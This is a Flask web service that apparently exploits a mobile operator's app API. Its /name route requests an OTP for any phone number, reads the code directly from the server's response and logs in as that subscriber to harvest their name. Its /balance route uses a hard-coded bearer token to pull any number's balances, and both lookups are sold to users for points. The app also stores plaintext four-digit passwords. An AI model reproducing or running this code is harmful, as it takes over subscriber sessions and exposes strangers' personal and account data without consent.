from flask import Flask, request, jsonify, render_template
import httpx
import re
import secrets
from datetime import datetime

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("signin.html")
@app.route("/dashboard")
def dashboard():
    return render_template("dashboard.html")
# =========================
# إعدادات API
# =========================
signup_url = "http://ec2-18-210-103-52.compute-1.amazonaws.com/mymoovbemobile/auth/signupByPhone"
signin_url = "http://ec2-18-210-103-52.compute-1.amazonaws.com/mymoovbemobile/auth/signInByPhone"
firebase_url = "https://moov-24948-default-rtdb.firebaseio.com/users"

headers = {
    "User-Agent": "Dart/3.5 (dart:io)",
    "Accept": "application/json; charset=UTF-8",
    "Content-Type": "application/json",
    "lang": "fr"
}

# =========================
# أدوات مساعدة
# =========================
def validate_phone(phone):
    return re.fullmatch(r"4\d{7}", phone) is not None

def validate_password(password):
    return re.fullmatch(r"\d{4}", password) is not None

def generate_token(phone):
    return f"{phone}_{secrets.token_hex(32)}"

def created_at():
    return datetime.utcnow().isoformat()

async def fetch_json(client, method, url, **kwargs):
    try:
        r = await client.request(method, url, timeout=10, **kwargs)
        return r.status_code, r.json() if r.text else {}
    except Exception as e:
        return 500, {"error": str(e)}

# =========================
# إنشاء حساب (إرسال OTP)
# =========================
@app.route("/api/signup/start", methods=["POST"])
async def signup_start():
    data = request.json or {}

    phone = data.get("phone")
    password = data.get("password")

    if not phone or not password:
        return jsonify({
            "status": "error",
            "message": "البيانات ناقصة"
        }), 400

    if not validate_phone(phone):
        return jsonify({
            "status": "error",
            "message": "رقم الهاتف غير صالح"
        }), 400

    if not validate_password(password):
        return jsonify({
            "status": "error",
            "message": "كلمة المرور غير صحيحة"
        }), 400

    # التحقق من Firebase (منع التكرار)
    async with httpx.AsyncClient(verify=True) as client:
        status, existing = await fetch_json(
            client,
            "GET",
            f"{firebase_url}/{phone}.json"
        )

    if existing:
        return jsonify({
            "status": "error",
            "message": "هذا الرقم مسجل مسبقاً يرجى تسجيل الدخول"
        }), 409

    payload = {
        "phone": phone
    }

    async with httpx.AsyncClient(verify=True) as client:
        status, resp = await fetch_json(
            client,
            "POST",
            signup_url,
            json=payload,
            headers=headers
        )

    if status != 200:
        return jsonify({
            "status": "error",
            "message": "فشل إرسال OTP",
            "details": resp
        }), 500

    return jsonify({
        "status": "success",
        "message": "ادخل رمز OTP الذي وصلك عبر SMS"
    })

# =========================
# التحقق وإنشاء الحساب النهائي
# =========================
@app.route("/api/signup/verify", methods=["POST"])
async def signup_verify():
    data = request.json or {}

    phone = data.get("phone")
    password = data.get("password")
    otp = data.get("otp")

    if not all([phone, password, otp]):
        return jsonify({
            "status": "error",
            "message": "بيانات ناقصة"
        }), 400

    payload = {
        "phoneNo": phone,
        "otp": otp
    }
    
    async with httpx.AsyncClient(verify=True) as client:
        status, resp = await fetch_json(
            client,
            "POST",
            signin_url,
            json=payload,
            headers=headers
        )

    if status != 200:
        return jsonify({
            "status": "error",
            "message": "فشل التحقق من OTP",
            "details": resp
        }), 401

    # استخراج الاسم من nomPrenom
    username = "مستخدم"

    if isinstance(resp, dict):
        username = resp.get("nomPrenom", "مجهول")

        parts = username.split()
        if len(parts) >= 2:
            username = " ".join(reversed(parts))

    # إنشاء التوكن
    token = generate_token(phone)

    # وقت إنشاء الحساب
    account_created_at = created_at()

    firebase_data = {
        "phone": phone,
        "username": username,
        "password": password,
        "points": 2,
        "token": token,
        "created_at": account_created_at
    }

    # حفظ البيانات في Firebase
    async with httpx.AsyncClient(verify=True) as client:
        await fetch_json(
            client,
            "PUT",
            f"{firebase_url}/{phone}.json",
            json=firebase_data
        )

    return jsonify({
    "status": "success",
    "message": f"تم إنشاء الحساب بنجاح، مرحباً {username}",
    "username": username,
    "token": token
})
@app.route("/api/login", methods=["POST"])
async def login():

    data = request.json or {}

    phone = str(data.get("phone", "")).strip()
    password = str(data.get("password", "")).strip()

    if not phone:
        return jsonify({
            "status": "error",
            "message": "يرجى إدخال رقم الهاتف"
        }), 400

    if not password:
        return jsonify({
            "status": "error",
            "message": "يرجى إدخال كلمة المرور"
        }), 400

    if not validate_phone(phone):
        return jsonify({
            "status": "error",
            "message": "رقم الهاتف غير صالح"
        }), 400

    if not validate_password(password):
        return jsonify({
            "status": "error",
            "message": "كلمة المرور غير صالحة"
        }), 400

    async with httpx.AsyncClient(verify=True) as client:

        response = await client.get(
            f"{firebase_url}/{phone}.json"
        )

    if response.status_code != 200:
        return jsonify({
            "status": "error",
            "message": "تعذر الاتصال بقاعدة البيانات"
        }), 500

    user = response.json()

    if not user:
        return jsonify({
            "status": "error",
            "message": "رقم الهاتف غير مسجل"
        }), 404

    if str(user.get("password", "")) != password:
        return jsonify({
            "status": "error",
            "message": "كلمة المرور غير صحيحة"
        }), 401

    return jsonify({
        "status": "success",
        "message": f"مرحباً {user.get('username', 'مستخدم')}",
        "username": user.get("username"),
        "token": user.get("token")
    }), 200
@app.route("/api/token-login", methods=["POST"])
async def token_login():

    data = request.json or {}
    token = str(data.get("token", "")).strip()

    if not token:
        return jsonify({
            "status": "error",
            "message": "التوكن مفقود"
        }), 400

    try:
        phone = token.split("_")[0]

        if not validate_phone(phone):
            return jsonify({
                "status": "error",
                "message": "توكن غير صالح"
            }), 401

    except Exception:
        return jsonify({
            "status": "error",
            "message": "توكن غير صالح"
        }), 401

    try:

        async with httpx.AsyncClient(verify=True) as client:

            response = await client.get(
                f"{firebase_url}/{phone}.json"
            )

    except Exception:

        return jsonify({
            "status": "error",
            "message": "تعذر الاتصال بقاعدة البيانات"
        }), 500

    if response.status_code != 200:
        return jsonify({
            "status": "error",
            "message": "فشل جلب بيانات المستخدم"
        }), 500

    user = response.json()

    if not user:
        return jsonify({
            "status": "error",
            "message": "المستخدم غير موجود"
        }), 404

    if user.get("token") != token:
        return jsonify({
            "status": "error",
            "message": "التوكن غير صحيح"
        }), 401

    user.pop("password", None)
        

    return jsonify({
        "status": "success",
        "message": f"مرحباً {user.get('username', 'مستخدم')}",
        "user": user
    }), 200    


@app.route("/balance", methods=["POST"])
async def get_balance():

    data = request.json or {}

    phone_number = data.get("phone")
    token = data.get("token")

    if not phone_number or not token:
        return jsonify({"error": "missing data"}), 400

    # =========================
    # 1. فقط التحقق من صاحب التوكن (للنقاط)
    # =========================
    try:
        owner_phone = token.split("_")[0]
    except:
        return jsonify({"error": "invalid token"}), 401

    async with httpx.AsyncClient() as client:
        r = await client.get(f"{firebase_url}/{owner_phone}.json")

    user = r.json()

    if not user or user.get("token") != token:
        return jsonify({"error": "invalid token"}), 401

    points = int(user.get("points", 0))

    if points <= 0:
        return jsonify({"error": "no points"}), 403

    # خصم نقطة
    user["points"] = points - 1

    async with httpx.AsyncClient() as client:
        await client.put(f"{firebase_url}/{owner_phone}.json", json=user)

    # =========================
    # 2. طلب الرصيد (الرقم المدخل مستقل تماماً)
    # =========================
    url = "http://ec2-18-210-103-52.compute-1.amazonaws.com/mymoovbemobile/mainApp/moov-interface/line"

    params = {
        "z": "0",
        "phoneNumber": phone_number
    }

    headers = {
        "User-Agent": "Dart/3.5 (dart:io)",
        "Accept": "application/json; charset=UTF-8",
        "Accept-Encoding": "gzip",
        "mmauth": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxOTQ0NCIsImp0aSI6IjEiLCJyb2xlcyI6W3siYXV0aG9yaXR5IjoiTU9CX0NMSUVOVCJ9XSwiZG9tYWlucyI6W10sImlhdCI6MTc4MTYxNTExNn0.yKL0lfIOBPLM1idoUkiuiYVehANMHU6UOOW8kyES--g",
        "content-type": "application/json; charset=UTF-8"
    }

    try:
        async with httpx.AsyncClient(timeout=10) as client:
            response = await client.get(url, params=params, headers=headers)

        if response.status_code != 200:
            return jsonify({
                "status": "error",
                "message": "request failed",
                "status_code": response.status_code
            }), 500

        data = response.json()

        sold = float(data.get("sold", 0))
        balances = data.get("balances", [])

        result = [f"PRINCIPAL: {sold:.2f} UM"]

        def format_data(bytes_value):
            bytes_value = int(bytes_value)

            gb = bytes_value // (1024 ** 3)
            bytes_value %= (1024 ** 3)

            mb = bytes_value // (1024 ** 2)
            bytes_value %= (1024 ** 2)

            kb = bytes_value // 1024

            parts = []
            if gb:
                parts.append(f"{gb}GB")
            if mb:
                parts.append(f"{mb}MB")
            if kb:
                parts.append(f"{kb}KB")

            return " ".join(parts) if parts else "0KB"

        def format_date(date_str):
            if not date_str:
                return ""
            try:
                d = date_str[:10]
                t = date_str[11:16]
                y, m, dd = d.split("-")
                return f"{dd}/{m}/{y} {t}"
            except:
                return date_str

        for bal in balances:
            for d in bal.get("details", []):

                unit = d.get("unit", "")
                balance = d.get("balance", "0")
                expire = format_date(d.get("expireTime", ""))

                if unit == "sec":
                    minutes = int(balance) // 60
                    if minutes > 0:
                        result.append(f"{minutes} min GRATIPLUS ({expire})")

                elif unit == "SMS":
                    sms = int(balance)
                    if sms > 0:
                        result.append(f"{sms} SMS ({expire})")

                elif unit == "b":

                    if int(balance) == 0:
                        continue

                    size = format_data(balance)
                    initial = int(d.get("initialAmount", 0))

                    if initial > 30 * 1024 ** 3:
                        result.append(f"{size} INTERNET ({expire})")
                    else:
                        result.append(f"{size} BONUS INTERNET ({expire})")

        return jsonify({
            "status": "success",
            "points": user["points"],
            "result": result
        })

    except Exception as e:
        return jsonify({"error": str(e)}), 500
@app.route("/name", methods=["POST"])
async def get_name():

    data = request.json or {}

    phone_number = data.get("phone")
    token = data.get("token")

    if not phone_number or not token:
        return jsonify({"error": "missing data"}), 400

    # التحقق من التوكن
    try:
        owner_phone = token.split("_")[0]
    except:
        return jsonify({"error": "invalid token"}), 401

    async with httpx.AsyncClient() as client:
        r = await client.get(f"{firebase_url}/{owner_phone}.json")

    user = r.json()

    if not user or user.get("token") != token:
        return jsonify({"error": "invalid token"}), 401

    points = int(user.get("points", 0))

    if points <= 0:
        return jsonify({"error": "no points"}), 403

    # خصم نقطة
    user["points"] = points - 1

    async with httpx.AsyncClient() as client:
        await client.put(
            f"{firebase_url}/{owner_phone}.json",
            json=user
        )

    # إرسال OTP
    signup_payload = {
        "phone": phone_number
    }

    signup_headers = {
        "User-Agent": "Dart/3.5 (dart:io)",
        "Accept": "application/json; charset=UTF-8",
        "Content-Type": "application/json",
        "lang": "fr"
    }

    try:

        async with httpx.AsyncClient(timeout=10) as client:

            signup_response = await client.post(
                signup_url,
                json=signup_payload,
                headers=signup_headers
            )

        otp = signup_response.text.strip()

        if not otp:
            return jsonify({
                "error": "otp not found"
            }), 500

        signin_payload = {
            "phoneNo": phone_number,
            "otp": otp
        }

        async with httpx.AsyncClient(timeout=10) as client:

            signin_response = await client.post(
                signin_url,
                json=signin_payload,
                headers=signup_headers
            )

        if signin_response.status_code != 200:
            return jsonify({
                "error": "failed to get name"
            }), 500

        response_data = signin_response.json()

        name = response_data.get(
            "nomPrenom",
            "غير معروف"
        )

        parts = name.split()

        if len(parts) >= 2:
            name = " ".join(reversed(parts))

        return jsonify({
            "status": "success",
            "points": user["points"],
            "name": name
        })

    except Exception as e:
        return jsonify({
            "error": str(e)
        }), 500

if __name__ == "__main__":
    import os
    app.run(
        host="0.0.0.0",
        port=int(os.environ.get("PORT", 10000))
    )
